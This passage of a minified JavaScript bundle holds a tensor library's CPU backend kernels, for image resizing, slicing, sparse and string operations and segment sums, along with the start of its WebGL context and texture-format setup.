                          , nt = V + K * a[2]
                          , q = X * U
                          , rt = X * H
                          , lt = F * U
                          , ft = F * H;
                        for (let ht = 0; ht < d; ht++) {
                            const xt = I[y++];
                            f[Y + ht] += xt * q,
                            f[j + ht] += xt * rt,
                            f[J + ht] += xt * lt,
                            f[nt + ht] += xt * ft
                        }
                    }
                }
            }
            return e.makeTensorInfo([c, u, l, d], "float32", f)
        }
    };
    const EW = {
        kernelName: ac,
        backendName: "cpu",
        kernelFunc: function LW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o} = t
              , {alignCorners: r, halfPixelCenters: i, size: a} = s;
            it(o, "resizeNearestNeighbor");
            const c = ct(o.shape)
              , [l,u] = a
              , [d,h,p,f] = o.shape
              , m = e.data.get(o.dataId).values
              , g = new Float32Array(d * l * u * f)
              , b = [r && l > 1 ? h - 1 : h, r && u > 1 ? p - 1 : p]
              , x = [r && l > 1 ? l - 1 : l, r && u > 1 ? u - 1 : u]
              , I = b[0] / x[0]
              , y = b[1] / x[1];
            let w = 0;
            for (let C = 0; C < d; C++) {
                const k = C * c[0];
                for (let S = 0; S < l; S++) {
                    const T = i ? I * (S + .5) : I * S;
                    let R = Math.min(h - 1, r ? Math.round(T) : Math.floor(T));
                    i && (R = Math.max(0, R));
                    const L = k + R * c[1];
                    for (let V = 0; V < u; V++) {
                        const F = i ? y * (V + .5) : y * V;
                        let X = Math.min(p - 1, r ? Math.round(F) : Math.floor(F));
                        i && (X = Math.max(0, X));
                        const A = L + X * c[2];
                        for (let P = 0; P < f; P++) {
                            const B = m[A + P];
                            g[w++] = B
                        }
                    }
                }
            }
            return e.makeTensorInfo([d, l, u, f], o.dtype, g)
        }
    };
    const WW = {
        kernelName: Vu,
        backendName: "cpu",
        kernelFunc: function DW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o, dy: r} = t
              , {alignCorners: i} = s;
            it([r, o], "resizeNearestNeighborGrad");
            const a = ct(o.shape)
              , c = ct(r.shape)
              , [l,u,d,h] = o.shape
              , [,p,f] = r.shape
              , m = new Float32Array(l * u * d * h)
              , g = e.data.get(r.dataId).values
              , b = [i && p > 1 ? u - 1 : u, i && f > 1 ? d - 1 : d]
              , x = [i && p > 1 ? p - 1 : p, i && f > 1 ? f - 1 : f]
              , I = b[0] / x[0]
              , y = b[1] / x[1]
              , w = 1 / I
              , C = 1 / y
              , k = 2 * Math.ceil(w) + 2
              , S = 2 * Math.ceil(C) + 2;
            for (let T = 0; T < l; T++) {
                const R = T * a[0];
                for (let L = 0; L < u; L++) {
                    const V = R + L * a[1]
                      , F = Math.floor(L * w)
                      , X = Math.floor(F - k / 2);
                    for (let A = 0; A < d; A++) {
                        const P = V + A * a[2]
                          , B = Math.floor(A * C)
                          , K = Math.floor(B - S / 2);
                        for (let H = 0; H < h; H++) {
                            let U = 0;
                            for (let Y = 0; Y < k; Y++) {
                                const j = Y + X;
                                if (j < 0 || j >= p)
                                    continue;
                                const J = R + j * c[1]
                                  , nt = j * I;
                                if (L === Math.min(u - 1, i ? Math.round(nt) : Math.floor(nt)))
                                    for (let rt = 0; rt < S; rt++) {
                                        const lt = rt + K;
                                        if (lt < 0 || lt >= f)
                                            continue;
                                        const ft = J + lt * c[2]
                                          , ht = lt * y;
                                        A === Math.min(d - 1, i ? Math.round(ht) : Math.floor(ht)) && (U += g[ft + H])
                                    }
                            }
                            m[P + H] = U
                        }
                    }
                }
            }
            return e.makeTensorInfo(o.shape, o.dtype, m)
        }
    };
    const VW = {
        kernelName: lc,
        backendName: "cpu",
        kernelFunc: function MW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {dims: r} = s;
            it(o, "reverse");
            const i = o.shape.length
              , a = It(r, o.shape);
            if (0 === i)
                return Qn({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            const c = new xe(o.shape,o.dtype)
              , l = e.bufferSync(o);
            for (let u = 0; u < c.size; u++) {
                const d = c.indexToLoc(u)
                  , h = d.slice();
                a.forEach((p=>h[p] = o.shape[p] - 1 - h[p])),
                c.set(l.get(...h), ...d)
            }
            return e.makeTensorInfo(c.shape, c.dtype, c.values)
        }
    }
      , FW = {
        kernelName: Bu,
        backendName: "cpu",
        kernelFunc: ({inputs: n, attrs: t, backend: e})=>{
            const {image: s} = n
              , {radians: o, fillValue: r, center: i} = t
              , a = e
              , c = Se(s.dtype, Z(s.shape))
              , [l,u,d,h] = s.shape
              , [p,f] = ih(i, u, d)
              , g = Math.sin(o)
              , b = Math.cos(o)
              , x = a.data.get(s.dataId).values;
            for (let y = 0; y < l; y++) {
                const w = y * d * u * h;
                for (let C = 0; C < u; C++) {
                    const k = C * (d * h);
                    for (let S = 0; S < d; S++) {
                        const T = S * h;
                        for (let R = 0; R < h; R++) {
                            const L = [l, C, S, R]
                              , V = L[2]
                              , F = L[1];
                            let X = (V - p) * b - (F - f) * g
                              , A = (V - p) * g + (F - f) * b;
                            X = Math.round(X + p),
                            A = Math.round(A + f);
                            let P = r;
                            if ("number" != typeof r && (P = 3 === R ? 255 : r[R]),
                            X >= 0 && X < d && A >= 0 && A < u) {
                                P = x[w + A * (d * h) + X * h + R]
                            }
                            c[w + k + T + R] = P
                        }
                    }
                }
            }
            return {
                dataId: a.write(c, s.shape, s.dtype),
                shape: s.shape,
                dtype: s.dtype
            }
        }
    }
      , zW = Et(si, (n=>{
        const t = Math.floor(n);
        return n - t < .5 ? Math.floor(n) : n - t > .5 ? Math.ceil(n) : t % 2 == 0 ? t : t + 1
    }
    ))
      , XW = {
        kernelName: si,
        backendName: "cpu",
        kernelFunc: zW
    };
    const PW = {
        kernelName: Nf,
        backendName: "cpu",
        kernelFunc: function AW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {indices: o, updates: r} = t
              , {shape: i} = s
              , {sliceRank: a, numUpdates: c, sliceSize: l, strides: u, outputSize: d} = co(0, o, i)
              , m = Io(e.bufferSync(o), e.bufferSync(r), i, d, l, c, a, u, 0, !0);
            return e.makeTensorInfo(i, m.dtype, m.values)
        }
    };
    function OW(n, t) {
        let e = 0
          , s = n.length
          , o = 0;
        for (; e < s; )
            o = Math.floor((e + s) / 2),
            n[o] < t ? e = o + 1 : s = o;
        return s
    }
    function KW(n, t) {
        let e = 0
          , s = n.length
          , o = 0;
        for (; e < s; )
            o = Math.floor((e + s) / 2),
            n[o] <= t ? e = o + 1 : s = o;
        return s
    }
    const HW = {
        kernelName: $f,
        backendName: "cpu",
        kernelFunc: function BW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {sortedSequence: o, values: r} = t
              , {side: i} = s
              , l = function ZW(n, t, e, s, o, r) {
                const i = qt("int32", e * o);
                for (let a = 0; a < e; ++a) {
                    const c = n.slice(a * s, (a + 1) * s)
                      , l = a * o;
                    for (let u = 0; u < o; ++u)
                        i[l + u] = "left" === r ? OW(c, t[u + l]) : KW(c, t[u + l])
                }
                return i
            }(e.data.get(o.dataId).values, e.data.get(r.dataId).values, o.shape[0], o.shape[1], r.shape[1], i);
            return e.makeTensorInfo(r.shape, "int32", l)
        }
    };
    const UW = {
        kernelName: uc,
        backendName: "cpu",
        kernelFunc: function _W(n) {
            const {inputs: t, backend: e} = n
              , {condition: s, t: o, e: r} = t;
            it([s, o, r], "select");
            const i = s.shape.length
              , a = e.data.get(s.dataId).values
              , c = e.data.get(o.dataId).values
              , l = e.data.get(r.dataId).values
              , u = _e(o.dtype, r.dtype)
              , d = ke(Z(o.shape), u);
            let h = 0;
            const p = 0 === i || i > 1 || 1 === o.shape.length ? 1 : Z(o.shape.slice(1));
            for (let f = 0; f < a.length; f++)
                for (let m = 0; m < p; m++)
                    1 === a[f] ? d[h++] = c[f] : d[h++] = l[f];
            return e.makeTensorInfo(o.shape, u, d)
        }
    }
      , YW = Pc
      , QW = Oc
      , JW = Et(ri, (n=>n >= 0 ? QW * n : YW * (Math.exp(n) - 1)))
      , jW = {
        kernelName: ri,
        backendName: "cpu",
        kernelFunc: JW
    }
      , qW = Et(ci, (n=>n < 0 ? -1 : n > 0 ? 1 : 0))
      , tM = {
        kernelName: ci,
        backendName: "cpu",
        kernelFunc: qW
    }
      , eM = Et(ii, (n=>Math.sin(n)))
      , nM = {
        kernelName: ii,
        backendName: "cpu",
        kernelFunc: eM
    }
      , sM = Et(ai, (n=>Math.sinh(n)))
      , oM = {
        kernelName: ai,
        backendName: "cpu",
        kernelFunc: sM
    }
      , o1 = Math.log(1.1920928955078125e-7) + 2
      , rM = Et(ui, (n=>{
        const t = n > -o1
          , e = n < o1
          , s = Math.exp(n);
        let o;
        return o = e ? s : t ? n : Math.log(1 + s),
        o
    }
    ))
      , iM = {
        kernelName: ui,
        backendName: "cpu",
        kernelFunc: rM
    };
    const cM = {
        kernelName: pc,
        backendName: "cpu",
        kernelFunc: function aM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {blockShape: r, paddings: i} = s;
            it([o], "spaceToBatchND");
            const a = Z(r)
              , c = [[0, 0]];
            c.push(...i);
            for (let C = 1 + r.length; C < o.shape.length; ++C)
                c.push([0, 0]);
            const l = s1.kernelFunc({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    paddings: c,
                    constantValue: 0
                }
            })
              , u = Mi(l.shape, r, a, !1)
              , d = Vi(u.length, r.length, !1)
              , h = Fi(l.shape, r, a, !1)
              , m = At({
                inputs: {
                    x: l
                },
                backend: e,
                attrs: {
                    shape: u
                }
            })
              , x = Ke({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    perm: d
                }
            })
              , w = At({
                inputs: {
                    x: x
                },
                backend: e,
                attrs: {
                    shape: h
                }
            });
            return e.disposeIntermediateTensorInfo(l),
            e.disposeIntermediateTensorInfo(m),
            e.disposeIntermediateTensorInfo(x),
            w
        }
    };
    const uM = {
        kernelName: Gf,
        backendName: "cpu",
        kernelFunc: function lM(n) {
            const {inputs: t, backend: e} = n
              , {indices: s, values: o, denseShape: r, defaultValue: i} = t;
            if (1 !== r.shape.length)
                throw new Error(`Dense shape must be a vector, saw:\n        ${r.shape}`);
            if (2 !== s.shape.length)
                throw new Error(`Indices must be a matrix, saw:\n        ${s.shape}`);
            if (1 !== o.shape.length)
                throw new Error(`Values must be a vector, saw:\n        ${o.shape}`);
            if (0 !== i.shape.length)
                throw new Error(`Default value must be a scalar, saw:\n        ${i.shape}`);
            const a = e.data.get(s.dataId).values
              , c = e.data.get(o.dataId).values
              , l = e.data.get(r.dataId).values
              , u = e.data.get(i.dataId).values[0]
              , [d,h,p,f,m] = $y(a, s.shape, s.dtype, c, o.dtype, l, u);
            return [e.makeTensorInfo(h, s.dtype, d), e.makeTensorInfo([h[0]], o.dtype, p), e.makeTensorInfo([f.length], "bool", new Uint8Array(f.map((g=>Number(g))))), e.makeTensorInfo([m.length], s.dtype, new Int32Array(m))]
        }
    };
    const hM = {
        kernelName: Lf,
        backendName: "cpu",
        kernelFunc: function dM(n) {
            const {inputs: t, backend: e} = n
              , {inputIndices: s, inputShape: o, newShape: r} = t;
            if (2 !== s.shape.length)
                throw new Error(`Input indices should be a matrix but received shape\n        ${s.shape}`);
            if (1 !== o.shape.length)
                throw new Error(`Input shape should be a vector but received shape\n        ${o.shape}`);
            if (1 !== r.shape.length)
                throw new Error(`Target shape should be a vector but received shape ${r.shape}`);
            const i = Array.from(e.data.get(o.dataId).values)
              , a = e.data.get(s.dataId).values
              , c = Array.from(e.data.get(r.dataId).values)
              , [l,u,d] = Gy(a, s.shape, s.dtype, i, c);
            return [e.makeTensorInfo(u, s.dtype, l), e.makeTensorInfo([d.length], r.dtype, new Int32Array(d))]
        }
    };
    const fM = {
        kernelName: Ef,
        backendName: "cpu",
        kernelFunc: function pM(n) {
            const {inputs: t, backend: e} = n
              , {data: s, indices: o, segmentIds: r} = t;
            if (s.shape.length < 1)
                throw new Error("Data should be at least 1 dimensional but received scalar");
            if (1 !== o.shape.length)
                throw new Error(`Indices should be a vector but received shape\n          ${o.shape}`);
            if (1 !== r.shape.length)
                throw new Error(`Segment ids should be a vector but received shape\n          ${r.shape}`);
            if (o.shape[0] !== r.shape[0])
                throw new Error("segmentIds and indices should have same size.");
            const i = e.data.get(s.dataId).values
              , a = e.data.get(o.dataId).values
              , c = e.data.get(r.dataId).values
              , [l,u] = pp(i, s.shape, s.dtype, a, c, !0);
            return e.makeTensorInfo(u, s.dtype, l)
        }
    };
    const gM = {
        kernelName: Df,
        backendName: "cpu",
        kernelFunc: function mM(n) {
            const {inputs: t, backend: e} = n
              , {data: s, indices: o, segmentIds: r} = t;
            if (s.shape.length < 1)
                throw new Error("Data should be at least 1 dimensional but received scalar");
            if (1 !== o.shape.length)
                throw new Error(`Indices should be a vector but received shape\n         ${o.shape}`);
            if (1 !== r.shape.length)
                throw new Error(`Segment ids should be a vector but received shape\n         ${r.shape}`);
            if (o.shape[0] !== r.shape[0])
                throw new Error("segmentIds and indices should have same size.");
            const i = e.data.get(s.dataId).values
              , a = e.data.get(o.dataId).values
              , c = e.data.get(r.dataId).values
              , [l,u] = pp(i, s.shape, s.dtype, a, c);
            return e.makeTensorInfo(u, s.dtype, l)
        }
    };
    const xM = {
        kernelName: Wf,
        backendName: "cpu",
        kernelFunc: function bM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {sparseIndices: o, sparseValues: r, defaultValue: i} = t
              , {outputShape: a} = s
              , {sliceRank: c, numUpdates: l, sliceSize: u, strides: d, outputSize: h} = co(0, o, a)
              , p = !1
              , f = e.bufferSync(o);
            let m;
            switch (r.dtype) {
            case "bool":
                m = Io(f, e.bufferSync(r), a, h, u, l, c, d, !!e.data.get(i.dataId).values[0], p);
                break;
            case "float32":
                m = Io(f, e.bufferSync(r), a, h, u, l, c, d, e.data.get(i.dataId).values[0], p);
                break;
            case "int32":
                m = Io(f, e.bufferSync(r), a, h, u, l, c, d, e.data.get(i.dataId).values[0], p);
                break;
            case "string":
                m = Io(f, e.bufferSync(r), a, h, u, l, c, d, xs(e.data.get(i.dataId).values[0]), p);
                break;
            default:
                throw new Error(`Unsupported type ${r.dtype}`)
            }
            return e.makeTensorInfo(a, m.dtype, m.values)
        }
    };
    const IM = {
        kernelName: fc,
        backendName: "cpu",
        kernelFunc: function yM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {numOrSizeSplits: r, axis: i} = s
              , a = It(i, o.shape)[0]
              , c = Ch(o, r, a)
              , l = new Array(o.shape.length).fill(0)
              , u = o.shape.slice();
            return c.map((d=>{
                const h = [...u];
                h[a] = d;
                const p = wo({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        begin: l,
                        size: h
                    }
                });
                return l[a] += d,
                p
            }
            ))
        }
    }
      , wM = {
        kernelName: zu,
        backendName: "cpu",
        kernelFunc: ({inputs: n, backend: t})=>{
            const {x: e} = n
              , s = t;
            it(e, "square");
            const o = s.data.get(e.dataId).values
              , r = new Float32Array(o.length);
            for (let a = 0; a < o.length; ++a) {
                const c = o[a];
                r[a] = c * c
            }
            return {
                dataId: s.write(r, e.shape, e.dtype),
                shape: e.shape,
                dtype: e.dtype
            }
        }
    }
      , CM = Et(bi, ((n,t)=>{
        const e = t;
        return isNaN(n) ? NaN : n > 0 ? 1 : e.alpha
    }
    ))
      , vM = {
        kernelName: bi,
        backendName: "cpu",
        kernelFunc: CM
    };
    const kM = {
        kernelName: Au,
        backendName: "cpu",
        kernelFunc: function SM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {begin: r, end: i, strides: a, beginMask: c, endMask: l, ellipsisMask: u, newAxisMask: d, shrinkAxisMask: h} = s;
            it(o, "stridedSlice");
            const {finalShapeSparse: p, finalShape: f, isIdentity: m, sliceDim0: g, isSimpleSlice: b, begin: x, end: I, strides: y} = sh(o.shape, r, i, a, c, l, u, d, h);
            let w;
            if (m)
                w = At({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        shape: f
                    }
                });
            else if (g || b) {
                v(o.shape.length >= 1, (()=>`Input must have rank at least 1, got: ${o.shape.length}`));
                const C = th(x, I, y)
                  , k = wo({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        begin: x,
                        size: C
                    }
                });
                w = At({
                    inputs: {
                        x: k
                    },
                    backend: e,
                    attrs: {
                        shape: f
                    }
                }),
                e.disposeIntermediateTensorInfo(k)
            } else {
                const k = Dy(p, e.bufferSync(o), y, x);
                w = e.makeTensorInfo(f, k.dtype, k.values)
            }
            return w
        }
    };
    const NM = {
        kernelName: Mf,
        backendName: "cpu",
        kernelFunc: function TM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {separator: o, nGramWidths: r, leftPad: i, rightPad: a, padWidth: c, preserveShortSequences: l} = s
              , {data: u, dataSplits: d} = t
              , h = e.data.get(u.dataId).values
              , p = e.data.get(d.dataId).values
              , [f,m] = Wy(h, p, o, r, i, a, c, l);
            return [e.makeTensorInfo([f.length], "string", f), e.makeTensorInfo(d.shape, "int32", m)]
        }
    };
    const $M = {
        kernelName: Vf,
        backendName: "cpu",
        kernelFunc: function RM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {skipEmpty: o} = s
              , {input: r, delimiter: i} = t;
            if ("string" !== r.dtype)
                throw new Error("Input must be of datatype string");
            if (1 !== r.shape.length)
                throw new Error(`Input must be a vector, got shape: ${r.shape}`);
            if (0 !== i.shape.length)
                throw new Error(`Delimiter must be a scalar, got shape: ${i.shape}`);
            const a = e.data.get(r.dataId).values
              , c = e.data.get(i.dataId).values[0]
              , [l,u,d] = My(a, c, o)
              , h = u.length;
            return [e.makeTensorInfo([h, 2], "int32", l), e.makeTensorInfo([h], "string", u), e.makeTensorInfo([2], "int32", new Int32Array(d))]
        }
    };
    const LM = {
        kernelName: Ff,
        backendName: "cpu",
        kernelFunc: function GM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {numBuckets: o} = s
              , {input: r} = t;
            if ("string" !== r.dtype)
                throw new Error("Input must be of datatype string");
            if (o <= 0)
                throw new Error("Number of buckets must be at least 1");
            const a = Vy(e.data.get(r.dataId).values, o);
            return e.makeTensorInfo(r.shape, "int32", a)
        }
    }
      , EM = Et(fi, (n=>Math.tan(n)))
      , DM = {
        kernelName: fi,
        backendName: "cpu",
        kernelFunc: EM
    }
      , WM = Et(mi, (n=>Math.tanh(n)));
    const FM = {
        kernelName: Rf,
        backendName: "cpu",
        kernelFunc: function VM(n) {
            const {inputs: t, backend: e} = n
              , {tensor: s, indices: o, updates: r} = t
              , {sliceRank: i, numUpdates: a, sliceSize: c, strides: l, outputSize: u} = co(0, o, s.shape)
              , h = e.bufferSync(o)
              , p = e.bufferSync(r)
              , f = e.bufferSync(s)
              , m = Io(h, p, s.shape, u, c, a, i, l, f, !1);
            return e.makeTensorInfo(s.shape, m.dtype, m.values)
        }
    };
    const XM = {
        kernelName: gi,
        backendName: "cpu",
        kernelFunc: function zM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {reps: r} = s;
            it(o, "tile");
            const i = zy(e.bufferSync(o), r);
            return e.makeTensorInfo(i.shape, i.dtype, i.values)
        }
    };
    const PM = {
        kernelName: Pu,
        backendName: "cpu",
        kernelFunc: function AM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {k: r, sorted: i} = s;
            it(o, "topk");
            const a = e.data.get(o.dataId).values
              , [c,l] = Ay(a, o.shape, o.dtype, r, i);
            return [e.makeTensorInfo(c.shape, c.dtype, c.values), e.makeTensorInfo(l.shape, l.dtype, l.values)]
        }
    };
    const KM = {
        kernelName: Ou,
        backendName: "cpu",
        kernelFunc: function OM(n) {
            const {inputs: t, attrs: e, backend: s} = n
              , {image: o, transforms: r} = t
              , {interpolation: i, fillMode: a, fillValue: c, outputShape: l} = e
              , [u,d,h,p] = o.shape
              , [f,m] = l ?? [d, h]
              , g = [u, f, m, p]
              , b = ct(o.shape)
              , x = b[0]
              , I = b[1]
              , y = b[2]
              , w = ct(g)
              , C = w[0]
              , k = w[1]
              , S = w[2]
              , T = Se(o.dtype, Z(g));
            T.fill(c);
            const R = s.data.get(o.dataId).values
              , L = s.data.get(r.dataId).values;
            for (let F = 0; F < u; ++F) {
                const X = 1 === r.shape[0] ? L : L.subarray(8 * F, 8 * F + 8);
                for (let A = 0; A < f; ++A)
                    for (let P = 0; P < m; ++P)
                        for (let B = 0; B < p; ++B) {
                            let K;
                            const H = X[6] * P + X[7] * A + 1;
                            if (0 === H)
                                continue;
                            const U = (X[0] * P + X[1] * A + X[2]) / H
                              , Y = (X[3] * P + X[4] * A + X[5]) / H
                              , j = r1(U, h, a)
                              , J = r1(Y, d, a);
                            switch (i) {
                            case "nearest":
                                K = UM(R, d, h, x, I, y, F, J, j, B, c);
                                break;
                            case "bilinear":
                                K = YM(R, d, h, x, I, y, F, J, j, B, c);
                                break;
                            default:
                                throw new Error(`Error in Transform: Expect 'nearest' or 'bilinear', but got ${i}`)
                            }
                            T[F * C + A * k + P * S + B] = K
                        }
                return s.makeTensorInfo(g, o.dtype, T)
            }
            return {
                dataId: s.write(T, g, o.dtype),
                shape: o.shape,
                dtype: o.dtype
            }
        }
    };
    function r1(n, t, e) {
        switch (e) {
        case "reflect":
            return function ZM(n, t) {
                let e = n;
                if (e < 0)
                    if (t <= 1)
                        e = 0;
                    else {
                        const s = 2 * t;
                        e < s && (e = s * Math.trunc(-e / s) + e),
                        e = e < -t ? e + s : -e - 1
                    }
                else if (e > t - 1)
                    if (t <= 1)
                        e = 0;
                    else {
                        const s = 2 * t;
                        e -= s * Math.trunc(e / s),
                        e >= t && (e = s - e - 1)
                    }
                return Ks(0, e, t - 1)
            }(n, t);
        case "wrap":
            return function BM(n, t) {
                let e = n;
                if (e < 0)
                    if (t <= 1)
                        e = 0;
                    else {
                        const s = t - 1;
                        e += t * (Math.trunc(-e / s) + 1)
                    }
                else if (e > t - 1)
                    if (t <= 1)
                        e = 0;
                    else {
                        const s = t - 1;
                        e -= t * Math.trunc(e / s)
                    }
                return Ks(0, e, t - 1)
            }(n, t);
        case "nearest":
            return function _M(n, t) {
                return Ks(0, n, t - 1)
            }(n, t);
        default:
            return function HM(n, t) {
                return n
            }(n)
        }
    }
    function na(n, t, e, s, o, r, i, a, c, l, u) {
        return 0 <= a && a < t && 0 <= c && c < e ? n[i * s + a * o + c * r + l] : u
    }
    function UM(n, t, e, s, o, r, i, a, c, l, u) {
        return na(n, t, e, s, o, r, i, Math.round(a), Math.round(c), l, u)
    }
    function YM(n, t, e, s, o, r, i, a, c, l, u) {
        const d = Math.floor(a)
          , h = Math.floor(c)
          , p = d + 1
          , f = h + 1;
        return (p - a) * ((f - c) * na(n, t, e, s, o, r, i, d, h, l, u) + (c - h) * na(n, t, e, s, o, r, i, d, f, l, u)) + (a - d) * ((f - c) * na(n, t, e, s, o, r, i, p, h, l, u) + (c - h) * na(n, t, e, s, o, r, i, p, f, l, u))
    }
    const JM = {
        kernelName: Ku,
        backendName: "cpu",
        kernelFunc: function QM(n) {
            const {inputs: t, attrs: e, backend: s} = n
              , {axis: o} = e
              , {x: r} = t;
            it(r, "unique");
            const i = s.data.get(r.dataId).values
              , {outputValues: a, outputShape: c, indices: l} = Py(i, o, r.shape, r.dtype);
            return [s.makeTensorInfo(c, r.dtype, a), s.makeTensorInfo([l.length], "int32", l)]
        }
    };
    const qM = {
        kernelName: gc,
        backendName: "cpu",
        kernelFunc: function jM(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {value: o} = t;
            let {axis: r} = s;
            r < 0 && (r += o.shape.length);
            const i = o.shape.length
              , a = o.shape[r]
              , c = new Array(i - 1);
            let l = 0;
            for (let p = 0; p < i; p++)
                p !== r && (c[l++] = o.shape[p]);
            const u = new Array(i).fill(0)
              , d = o.shape.slice();
            d[r] = 1;
            const h = new Array(a);
            for (let p = 0; p < h.length; p++) {
                u[r] = p;
                const f = wo({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        begin: u,
                        size: d
                    }
                });
                h[p] = At({
                    inputs: {
                        x: f
                    },
                    backend: e,
                    attrs: {
                        shape: c
                    }
                }),
                e.disposeIntermediateTensorInfo(f)
            }
            return h
        }
    };
    const eV = {
        kernelName: bc,
        backendName: "cpu",
        kernelFunc: function tV(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, segmentIds: r} = t
              , {numSegments: i} = s;
            it(o, "unsortedSegmentSum");
            const l = []
              , u = []
              , d = o.shape.length - r.shape.length;
            let h = r;
            for (let f = 0; f < d; ++f) {
                const m = bl({
                    inputs: {
                        input: h
                    },
                    backend: e,
                    attrs: {
                        dim: f + 1
                    }
                });
                h = m,
                u.push(m)
            }
            for (let f = 0; f < i; ++f) {
                const m = gs(f, "int32")
                  , g = e.makeTensorInfo([], "int32", m)
                  , b = jx({
                    inputs: {
                        a: g,
                        b: h
                    },
                    backend: e
                })
                  , x = Ws({
                    inputs: {
                        x: b
                    },
                    backend: e,
                    attrs: {
                        dtype: "float32"
                    }
                })
                  , I = fl({
                    inputs: {
                        a: x,
                        b: o
                    },
                    backend: e
                })
                  , y = ea({
                    inputs: {
                        x: I
                    },
                    backend: e,
                    attrs: {
                        axis: 0,
                        keepDims: !1
                    }
                });
                l.push(y),
                u.push(g),
                u.push(b),
                u.push(x),
                u.push(I),
                u.push(y)
            }
            const p = n1({
                inputs: l,
                backend: e,
                attrs: {
                    axis: 0
                }
            });
            return u.forEach((f=>e.disposeIntermediateTensorInfo(f))),
            p
        }
    }
      , nV = [jL, EG, tE, nE, zG, oE, iE, cE, uE, hE, fE, gE, xE, wE, vE, TE, RE, GE, EE, QL, WE, VE, zE, AG, AE, VG, OG, OE, DG, KE, BE, HE, UE, QE, jE, t3, n3, o3, i3, c3, u3, h3, f3, g3, b3, y3, w3, v3, S3, k3, T3, R3, L3, KL, D3, KG, P3, ZG, O3, HG, U3, Y3, J3, UG, QG, q3, eD, sD, rD, jG, tL, WG, aD, ZE, lD, dD, pD, ZL, nL, oL, mD, iL, bD, ID, CD, kD, ND, $D, GD, cL, ED, WD, VD, zD, AD, OD, ZD, uL, HD, YD, jD, hL, fL, eW, oW, aW, gL, lW, dW, hW, s1, gW, HL, yL, xW, IW, CW, SW, MG, bp, TW, _L, UL, YL, RW, GW, EW, WW, VW, FW, XW, NL, PW, HW, UW, jW, $L, tM, nM, oM, GL, QD, iM, cM, uM, hM, fM, gM, xM, IM, DL, wM, ML, FL, vM, kM, NM, $M, LM, PL, $3, DM, {
        kernelName: mi,
        backendName: "cpu",
        kernelFunc: WM
    }, FM, XM, PM, KM, bL, JM, qM, eV, uW];
    for (const n of nV)
        qe(n);
    const Co = {}
      , yl = {
        alpha: !1,
        antialias: !1,
        premultipliedAlpha: !1,
        preserveDrawingBuffer: !1,
        depth: !1,
        stencil: !1,
        failIfMajorPerformanceCaveat: !0
    };
    function Mn(n, t) {
        if (!(n in Co) || null != t) {
            const s = function rV(n, t) {
                if (1 !== n && 2 !== n)
                    throw new Error("Cannot get WebGL rendering context, WebGL is disabled.");
                const e = t ?? function oV(n) {
                    if (!z().getBool("IS_SAFARI") && typeof OffscreenCanvas < "u" && 2 === n)
                        return new OffscreenCanvas(300,150);
                    if (typeof document < "u")
                        return document.createElement("canvas");
                    throw new Error("Cannot create a canvas in this context")
                }(n);
                return e.addEventListener("webglcontextlost", (s=>{
                    s.preventDefault(),
                    delete Co[n]
                }
                ), !1),
                z().getBool("SOFTWARE_WEBGL_ENABLED") && (yl.failIfMajorPerformanceCaveat = !1),
                1 === n ? e.getContext("webgl", yl) || e.getContext("experimental-webgl", yl) : e.getContext("webgl2", yl)
            }(n, t);
            if (null === s)
                return console.log("Could not get context for WebGL version", n),
                null;
            Co[n] = s
        }
        const e = Co[n];
        return null == e || e.isContextLost() ? (delete Co[n],
        Mn(n)) : (e.disable(e.DEPTH_TEST),
        e.disable(e.STENCIL_TEST),
        e.disable(e.BLEND),
        e.disable(e.DITHER),
        e.disable(e.POLYGON_OFFSET_FILL),
        e.disable(e.SAMPLE_COVERAGE),
        e.enable(e.SCISSOR_TEST),
        e.enable(e.CULL_FACE),
        e.cullFace(e.BACK),
        Co[n])
    }
    var sa, an, we;
    function oa(n, t) {
        return [t, n]
    }
    function Il(n) {
        const t = Z(n);
        return Ul(Math.ceil(t / 4))
    }
    function lr(n, t) {
        return [Math.max(1, Math.ceil(t / 2)), Math.max(1, Math.ceil(n / 2))]
    }
    function Ip(n, t) {
        const e = n;
        let s, o, r, i, a, c, l, u, d, h;
        return 2 === z().getNumber("WEBGL_VERSION") ? (s = e.R32F,
        o = e.R16F,
        r = e.RGBA16F,
        i = e.RGBA32F,
        a = e.RED,
        l = 4,
        u = 1,
        d = e.HALF_FLOAT,
        h = e.FLOAT,
        c = e.RGBA8) : (s = n.RGBA,
        o = n.RGBA,
        r = n.RGBA,
        i = e.RGBA,
        a = n.RGBA,
        l = 4,
        u = 4,
        d = null != t ? t.HALF_FLOAT_OES : null,
        h = n.FLOAT,
        c = n.RGBA),
        {
            internalFormatFloat: s,
            internalFormatHalfFloat: o,
            internalFormatPackedHalfFloat: r,
            internalFormatPackedFloat: i,
            textureFormatFloat: a,
            downloadTextureFormat: c,
            downloadUnpackNumChannels: l,
            defaultNumChannels: u,
            textureTypeHalfFloat: d,
            textureTypeFloat: h
        }
    }
    function ot(n, t) {
        const e = t();
        return z().getBool("DEBUG") && function cV(n) {
            const t = n.getError();
            if (t !== n.NO_ERROR)
                throw new Error("WebGL Error: " + function hV(n, t) {
                    switch (t) {
                    case n.NO_ERROR:
                        return "NO_ERROR";
                    case n.INVALID_ENUM:
                        return "INVALID_ENUM";
